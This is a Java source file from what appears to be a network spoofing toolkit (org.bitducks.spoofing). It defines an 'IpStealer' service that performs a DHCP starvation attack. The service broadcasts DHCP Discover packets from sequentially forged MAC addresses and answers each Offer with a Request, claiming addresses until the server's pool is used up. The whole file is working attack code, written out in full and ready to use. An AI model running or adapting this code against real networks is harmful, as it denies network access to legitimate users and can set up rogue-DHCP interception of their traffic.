package org.bitducks.spoofing.services;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.util.Random;

import jpcap.packet.EthernetPacket;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
import jpcap.packet.UDPPacket;

import org.bitducks.spoofing.core.Server;
import org.bitducks.spoofing.core.Service;
import org.bitducks.spoofing.core.rules.DHCPRule;
import org.bitducks.spoofing.util.Constants;
import org.dhcp4java.DHCPConstants;
import org.dhcp4java.DHCPPacket;


public class IpStealer extends Service {
	private int macAddr = 0;
	
	public IpStealer() {
		
		this.getPolicy().addRule(new DHCPRule());
		
	}

	@Override
	public void run() {
		this.logger.info("Ip Starvation service is started ...");
		
		this.doDiscover();
		
		UDPPacket packet = null;
		
		// If the packet is an EOF we will not be able to cast it to UPDPacket
		Packet tmpPacket = this.getNextBlockingPacket();
		
		while (!tmpPacket.equals(Packet.EOF)) {
			packet = (UDPPacket)tmpPacket;
			
			//System.out.println("Got packet " + packet);
			if (proceedDHCPOffer(packet)) {
				// Send another if the packet was a DHCPOffer
				this.doDiscover();
			}
			
			tmpPacket = this.getNextBlockingPacket();
		}

		this.logger.info("Ip Starvation service will shutdown NOW ...");
	}
	
	/**
	 * Change the mac address to an other one
	 * Do a DHCP Discover to get an Ip
	 */
	private void doDiscover() {
		++this.macAddr;
		
		UDPPacket udpDiscover = new UDPPacket(68, 67);
		
		try {
			this.setHeader(udpDiscover,
					InetAddress.getByAddress(Constants.NO_IP),
					InetAddress.getByAddress(Constants.BROADCAST_IP));
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		DHCPPacket discover = new DHCPPacket();
		discover.setOp(DHCPConstants.BOOTREQUEST);
		discover.setOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE, DHCPConstants.DHCPDISCOVER);
		discover.setHlen((byte) 6);
		discover.setChaddr(this.getMacAddr());
		discover.setXid( (new Random()).nextInt() );
		 
		udpDiscover.data = discover.serialize();
		
		Server.getInstance().sendPacket(udpDiscover);
	}
	
	/**
	 * Set the header of the updPacket
	 * @param packet
	 */
	private void setHeader(UDPPacket packet, InetAddress source, InetAddress destination) {
		
		packet.setIPv4Parameter(0, 
				false, 
				false, 
				false, 
				0, 
				false, 
				false, 
				false, 
				0, 
				0, //(new Random()).nextInt(),	// Identifier
				64, 						// TTL
				IPPacket.IPPROTO_UDP,  		// Protocol
				source, 
				destination);
		
		//create an Ethernet packet (frame)
		EthernetPacket ether = new EthernetPacket();
		//set frame type as IP
		ether.frametype = EthernetPacket.ETHERTYPE_IP;
		//set source and destination MAC addresses

		ether.src_mac = this.getMacAddr();
		ether.dst_mac =  Constants.BROADCAST;
		
		//set the datalink frame of the packet p as ether
		packet.datalink = ether;
	}
	
	private byte[] getMacAddr() {
		ByteBuffer buf = ByteBuffer.allocate(6);
		buf.put((byte)0x00);
		buf.put((byte)0x00);
		buf.putInt(this.macAddr);
		
		return buf.array();
	}
	
	/**
	 * Proceed the response from the DHCP Server.
	 * DHCP Ack are not supported
	 * Return true if the the packet was a DHCPOffer
	 * @param packet
	 */
	private boolean proceedDHCPOffer(UDPPacket packet) {
		
		DHCPPacket offer = DHCPPacket.getPacket(packet.data, 0, packet.data.length, false);
		if (!this.isDHCPOffer(offer)) {
			// If it is not an offer
			return false;
		}
		
		
		this.logger.info("Offer " + offer.getYiaddr());
		
		
		doDHCPRequest(offer);
		
		// This is an offer
		return true;
	}
	
	private void doDHCPRequest(DHCPPacket offer) {
		
		UDPPacket udpDRequest = new UDPPacket(68, 67);
		
		try {
			this.setHeader(udpDRequest,
					InetAddress.getByAddress(Constants.NO_IP),
					InetAddress.getByAddress(Constants.BROADCAST_IP));
		} catch (UnknownHostException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		DHCPPacket request = new DHCPPacket();
		request.setOp(DHCPConstants.BOOTREQUEST);
		request.setOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE, DHCPConstants.DHCPREQUEST);
		request.setHlen((byte) 6);
		request.setChaddr(this.getMacAddr());
		request.setXid( offer.getXid() );
		request.setOptionAsInetAddress(DHCPConstants.DHO_DHCP_REQUESTED_ADDRESS, offer.getYiaddr());
	
		udpDRequest.data = request.serialize();
		
		Server.getInstance().sendPacket(udpDRequest);
	}
	
	private boolean isDHCPOffer(DHCPPacket packet) {	
		return (packet.getOptionAsByte(DHCPConstants.DHO_DHCP_MESSAGE_TYPE) == DHCPConstants.DHCPOFFER);
	}

}
